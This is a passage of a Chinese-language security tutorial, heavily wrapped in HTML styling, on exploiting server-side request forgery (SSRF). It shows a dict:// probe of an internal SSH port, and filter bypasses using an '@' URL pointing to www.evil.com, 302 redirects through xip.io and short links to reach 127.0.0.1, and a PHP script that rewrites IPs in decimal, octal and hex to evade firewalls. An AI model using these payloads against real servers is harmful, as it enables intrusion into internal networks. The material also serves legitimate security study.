204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">url</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">=</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">dict</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">://</span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">192.168</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">.</span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">52.130</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">:</span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">22</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">/</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">info   </span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">//</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;"> ssh</span></code></span></span></p></li></ol></pre><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.23931623931623933" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/16_DAYbC2ycDvbP9qtoStYJRiarJd0vnQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5ghcrMJrc49Tib641WD1RzzFB8PHDAYbC2ycDvbP9qtoStYJRiarJd0vnQ/640?wx_fmt=png'" data-type="png" data-w="1755" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.27089627391742194" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/17_Dc7oedqELzOX3fxlKleESYvGrKAD8A.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gLOOUerOd1icLjRibWicehiaOtTrRDc7oedqELzOX3fxlKleESYvGrKAD8A/640?wx_fmt=png'" data-type="png" data-w="993" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">同样可以借助burpsuite来爆破内网主机上的服务。</p><h2 style="margin-top: 2rem;margin-bottom: 0.5rem;font-weight: 700;color: rgb(248, 95, 72);line-height: 1.35;font-size:24px;line-height:44px;;text-align: start;white-space: normal;font family: Menlo, Monaco, &quot;Source Code Pro&quot;, Consolas, Inconsolata, &quot;Ubuntu Mono&quot;, &quot;DejaVu Sans Mono&quot;, &quot;Courier New&quot;, &quot;Droid Sans Mono&quot;, &quot;Hiragino Sans GB&quot;, 微软雅黑, monospace !important;">相关绕过姿势</h2><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">对于SSRF的限制大致有如下几种：</p><ul style="padding-left: 30px;list-style-position: initial;list-style-image: initial;color: rgb(80, 97, 109);font-size:15px;line-height:35px;;text-align: start;white-space: normal;margin-top: 6px !important;list-style-type: square !important;" class="list-paddingleft-2"><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;font-size:14px;line-height:34px; !important;">限制请求的端口只能为Web端口，只允许访问HTTP和HTTPS的请求。</span></p></li><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;font-size:14px;line-height:34px; !important;">限制域名只能为http://www.xxx.com</span></p></li><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;font-size:14px;line-height:34px; !important;">限制不能访问内网的IP，以防止对内网进行攻击。</span></p></li><li style="margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);line-height: 22px;font-size:14px;line-height:34px; !important;">屏蔽返回的详细信息。</span></p></li></ul><h3 style="margin-top: 2rem;margin-bottom: 0.5rem;font-weight: 700;color: rgb(248, 95, 72);line-height: 1.35;font-size:20px;line-height:40px;;text-align: start;white-space: normal;font family: Menlo, Monaco, &quot;Source Code Pro&quot;, Consolas, Inconsolata, &quot;Ubuntu Mono&quot;, &quot;DejaVu Sans Mono&quot;, &quot;Courier New&quot;, &quot;Droid Sans Mono&quot;, &quot;Hiragino Sans GB&quot;, 微软雅黑, monospace !important;">利用HTTP基本身份认证的方式绕过</h3><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">如果目标代码限制访问的域名只能为 http://www.xxx.com ，那么我们可以采用HTTP基本身份认证的方式绕过。即@：http://www.xxx.com@www.evil.com</p><h3 style="margin-top: 2rem;margin-bottom: 0.5rem;font-weight: 700;color: rgb(248, 95, 72);line-height: 1.35;font-size:20px;line-height:40px;;text-align: start;white-space: normal;font family: Menlo, Monaco, &quot;Source Code Pro&quot;, Consolas, Inconsolata, &quot;Ubuntu Mono&quot;, &quot;DejaVu Sans Mono&quot;, &quot;Courier New&quot;, &quot;Droid Sans Mono&quot;, &quot;Hiragino Sans GB&quot;, 微软雅黑, monospace !important;">利用302跳转绕过内网IP</h3><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">绕过对内网ip的限制我们可以<strong style="color: rgb(0, 0, 0);">利用302跳转</strong>的方法，有以下两种。</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">（1）网络上存在一个很神奇的服务，网址为 http://xip.io，当访问这个服务的任意子域名的时候，都会重定向到这个子域名，举个例子：</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">当我们访问：http://127.0.0.1.xip.io/flag.php 时，实际上访问的是http://127.0.0.1/1.php 。像这种网址还有http://nip.io，http://sslip.io 。</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">如下示例（flag.php仅能从本地访问）：</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.4972253052164262" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/18_v5FHjMroT5Wprt0o0D9xRYia6REvnA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gsibKDibd9NwibwTfJibszpFuxBibBkv5FHjMroT5Wprt0o0D9xRYia6REvnA/640?wx_fmt=png'" data-type="png" data-w="901" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">（2）短地址跳转绕过，这里也给出一个网址 https://4m.cn/：</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.3724409448818898" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/19_YbqZ7mTkNHoCNG50nHyn3kd5pLc0fA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gGxldsco0XSHzicCpNvUuD33MPYbqZ7mTkNHoCNG50nHyn3kd5pLc0fA/640?wx_fmt=png'" data-type="png" data-w="1270" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">直接使用生成的短连接 https://4m.cn/FjOdQ 就会自动302跳转到 http://127.0.0.1/flag.php 上，这样就可以绕过WAF了：</p><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;"><img data-ratio="0.49333333333333335" src="图片/HACK学习呀_2021-04-01_干货SSRF漏洞利用总结/20_4fBvQGaHnf8G6x8uvnbvNzpuEz2m1A.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gfNDPYGCFEMicCQeicYDvQcwltL4fBvQGaHnf8G6x8uvnbvNzpuEz2m1A/640?wx_fmt=png'" data-type="png" data-w="900" style="box-sizing: border-box;border-width: 2px;border-style: solid;border-color: rgb(238, 238, 238);border-radius: 6px;"  /></p><h3 style="margin-top: 2rem;margin-bottom: 0.5rem;font-weight: 700;color: rgb(248, 95, 72);line-height: 1.35;font-size:20px;line-height:40px;;text-align: start;white-space: normal;font family: Menlo, Monaco, &quot;Source Code Pro&quot;, Consolas, Inconsolata, &quot;Ubuntu Mono&quot;, &quot;DejaVu Sans Mono&quot;, &quot;Courier New&quot;, &quot;Droid Sans Mono&quot;, &quot;Hiragino Sans GB&quot;, 微软雅黑, monospace !important;">进制的转换绕过内网IP</h3><p style="margin-top: 15px;margin-bottom: 15px;font-size:15px;line-height:35px;;white-space: pre-line;line-height: 30px;color: rgb(74, 74, 74);text-align: start;">可以使用一些不同的进制替代ip地址，从而绕过WAF，这里给出个从网上扒的php脚本可以一键转换：</p><pre style="padding-top: 8px;padding-bottom: 6px;background: rgb(45, 45, 45);border-radius: 0px;overflow-y: auto;color: rgb(80, 97, 109);text-align: start;font-size:10px;line-height:30px;;line-height: 12px;font family: consolas, menlo, courier, monospace, &quot;Microsoft Yahei&quot; !important;border-width: 1px !important;border-style: solid !important;border-color: rgb(226, 226, 226) !important;"><ol class="list-paddingleft-2" style="padding-top: 10px;padding-bottom: 10px;padding-left: 30px;list-style-position: initial;list-style-image: initial;color: transparent;overflow-y: auto;list-style-type: none !important;"><li style="padding-left: 1em;list-style-type: decimal;margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);display: block;line-height: 22px;font-size:14px;line-height:34px; !important;word-break: inherit !important;"><span style="line-height: 22px;display: block;word-break: inherit !important;"><code style="white-space: pre-wrap;margin-left: -20px;display: flex;overflow: initial;line-height: 12px;overflow-wrap: normal;border-width: 0px;border-style: initial;border-color: initial;font-size:10px;line-height:30px;;font family: inherit !important;"><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">&lt;?</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">php</span></code></span></span></p></li><li style="padding-left: 1em;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;list-style-type: decimal;margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);display: block;line-height: 22px;font-size:14px;line-height:34px; !important;word-break: inherit !important;"><span style="line-height: 22px;display: block;word-break: inherit !important;"><code style="white-space: pre-wrap;margin-left: -20px;display: flex;overflow: initial;line-height: 12px;overflow-wrap: normal;border-width: 0px;border-style: initial;border-color: initial;font-size:10px;line-height:30px;;font family: inherit !important;"><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">$ip </span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">=</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;"> </span><span style="color: rgb(153, 204, 153);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">'127.0.0.1'</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">;</span></code></span></span></p></li><li style="padding-left: 1em;list-style-type: decimal;margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);display: block;line-height: 22px;font-size:14px;line-height:34px; !important;word-break: inherit !important;"><span style="line-height: 22px;display: block;word-break: inherit !important;"><code style="white-space: pre-wrap;margin-left: -20px;display: flex;overflow: initial;line-height: 12px;overflow-wrap: normal;border-width: 0px;border-style: initial;border-color: initial;font-size:10px;line-height:30px;;font family: inherit !important;"><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">$ip </span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">=</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;"> explode</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">(</span><span style="color: rgb(153, 204, 153);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">'.'</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">,</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">$ip</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">);</span></code></span></span></p></li><li style="padding-left: 1em;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;list-style-type: decimal;margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);display: block;line-height: 22px;font-size:14px;line-height:34px; !important;word-break: inherit !important;"><span style="line-height: 22px;display: block;word-break: inherit !important;"><code style="white-space: pre-wrap;margin-left: -20px;display: flex;overflow: initial;line-height: 12px;overflow-wrap: normal;border-width: 0px;border-style: initial;border-color: initial;font-size:10px;line-height:30px;;font family: inherit !important;"><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">$r </span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">=</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;"> </span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">(</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">$ip</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">[</span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">0</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">]</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;"> </span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">&lt;&lt;</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;"> </span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">24</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">)</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;"> </span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">|</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;"> </span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">(</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">$ip</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">[</span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">1</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">]</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;"> </span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">&lt;&lt;</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;"> </span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">16</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">)</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;"> </span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">|</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;"> </span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">(</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">$ip</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">[</span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">2</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">]</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;"> </span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">&lt;&lt;</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;"> </span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">8</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">)</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;"> </span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">|</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;"> $ip</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">[</span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">3</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">]</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;"> </span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">;</span></code></span></span></p></li><li style="padding-left: 1em;list-style-type: decimal;margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);display: block;line-height: 22px;font-size:14px;line-height:34px; !important;word-break: inherit !important;"><span style="line-height: 22px;display: block;word-break: inherit !important;"><code style="white-space: pre-wrap;margin-left: -20px;display: flex;overflow: initial;line-height: 12px;overflow-wrap: normal;border-width: 0px;border-style: initial;border-color: initial;font-size:10px;line-height:30px;;font family: inherit !important;"><span style="color: rgb(204, 153, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">if</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">(</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">$r </span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">&lt;</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;"> </span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">0</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">)</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;"> </span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">{</span></code></span></span></p></li><li style="padding-left: 1em;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;list-style-type: decimal;margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);display: block;line-height: 22px;font-size:14px;line-height:34px; !important;word-break: inherit !important;"><span style="line-height: 22px;display: block;word-break: inherit !important;"><code style="white-space: pre-wrap;margin-left: -20px;display: flex;overflow: initial;line-height: 12px;overflow-wrap: normal;border-width: 0px;border-style: initial;border-color: initial;font-size:10px;line-height:30px;;font family: inherit !important;"><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">    $r </span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">+=</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;"> </span><span style="color: rgb(249, 145, 87);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">4294967296</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">;</span></code></span></span></p></li><li style="padding-left: 1em;list-style-type: decimal;margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);display: block;line-height: 22px;font-size:14px;line-height:34px; !important;word-break: inherit !important;"><span style="line-height: 22px;display: block;word-break: inherit !important;"><code style="white-space: pre-wrap;margin-left: -20px;display: flex;overflow: initial;line-height: 12px;overflow-wrap: normal;border-width: 0px;border-style: initial;border-color: initial;font-size:10px;line-height:30px;;font family: inherit !important;"><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">}</span></code></span></span></p></li><li style="padding-left: 1em;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;list-style-type: decimal;margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);display: block;line-height: 22px;font-size:14px;line-height:34px; !important;word-break: inherit !important;"><span style="line-height: 22px;display: block;word-break: inherit !important;"><code style="white-space: pre-wrap;margin-left: -20px;display: flex;overflow: initial;line-height: 12px;overflow-wrap: normal;border-width: 0px;border-style: initial;border-color: initial;font-size:10px;line-height:30px;;font family: inherit !important;"><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">echo </span><span style="color: rgb(153, 204, 153);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">"十进制:"</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">;</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">     </span><span style="color: rgb(153, 153, 153);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">// 2130706433</span></code></span></span></p></li><li style="padding-left: 1em;list-style-type: decimal;margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);display: block;line-height: 22px;font-size:14px;line-height:34px; !important;word-break: inherit !important;"><span style="line-height: 22px;display: block;word-break: inherit !important;"><code style="white-space: pre-wrap;margin-left: -20px;display: flex;overflow: initial;line-height: 12px;overflow-wrap: normal;border-width: 0px;border-style: initial;border-color: initial;font-size:10px;line-height:30px;;font family: inherit !important;"><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">echo $r</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">;</span></code></span></span></p></li><li style="padding-left: 1em;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;list-style-type: decimal;margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);display: block;line-height: 22px;font-size:14px;line-height:34px; !important;word-break: inherit !important;"><span style="line-height: 22px;display: block;word-break: inherit !important;"><code style="white-space: pre-wrap;margin-left: -20px;display: flex;overflow: initial;line-height: 12px;overflow-wrap: normal;border-width: 0px;border-style: initial;border-color: initial;font-size:10px;line-height:30px;;font family: inherit !important;"><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">echo </span><span style="color: rgb(153, 204, 153);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">"八进制:"</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">;</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">     </span><span style="color: rgb(153, 153, 153);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">// 0177.0.0.1</span></code></span></span></p></li><li style="padding-left: 1em;list-style-type: decimal;margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);display: block;line-height: 22px;font-size:14px;line-height:34px; !important;word-break: inherit !important;"><span style="line-height: 22px;display: block;word-break: inherit !important;"><code style="white-space: pre-wrap;margin-left: -20px;display: flex;overflow: initial;line-height: 12px;overflow-wrap: normal;border-width: 0px;border-style: initial;border-color: initial;font-size:10px;line-height:30px;;font family: inherit !important;"><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">echo decoct</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">(</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">$r</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">);</span></code></span></span></p></li><li style="padding-left: 1em;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;list-style-type: decimal;margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);display: block;line-height: 22px;font-size:14px;line-height:34px; !important;word-break: inherit !important;"><span style="line-height: 22px;display: block;word-break: inherit !important;"><code style="white-space: pre-wrap;margin-left: -20px;display: flex;overflow: initial;line-height: 12px;overflow-wrap: normal;border-width: 0px;border-style: initial;border-color: initial;font-size:10px;line-height:30px;;font family: inherit !important;"><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">echo </span><span style="color: rgb(153, 204, 153);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">"十六进制:"</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">;</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">   </span><span style="color: rgb(153, 153, 153);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">// 0x7f.0.0.1</span></code></span></span></p></li><li style="padding-left: 1em;list-style-type: decimal;margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);display: block;line-height: 22px;font-size:14px;line-height:34px; !important;word-break: inherit !important;"><span style="line-height: 22px;display: block;word-break: inherit !important;"><code style="white-space: pre-wrap;margin-left: -20px;display: flex;overflow: initial;line-height: 12px;overflow-wrap: normal;border-width: 0px;border-style: initial;border-color: initial;font-size:10px;line-height:30px;;font family: inherit !important;"><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">echo dechex</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">(</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">$r</span><span style="color: rgb(204, 204, 204);line-height: 20px;font-size:13px;line-height:33px; !important;white-space: inherit !important;">);</span></code></span></span></p></li><li style="padding-left: 1em;background-image: initial;background-position: initial;background-size: initial;background-repeat: initial;background-attachment: initial;background-origin: initial;background-clip: initial;list-style-type: decimal;margin-top: 6px !important;"><p><span style="color: rgb(74, 74, 74);display: block;line-height: 22px;font-size:14px;line-height:34px; 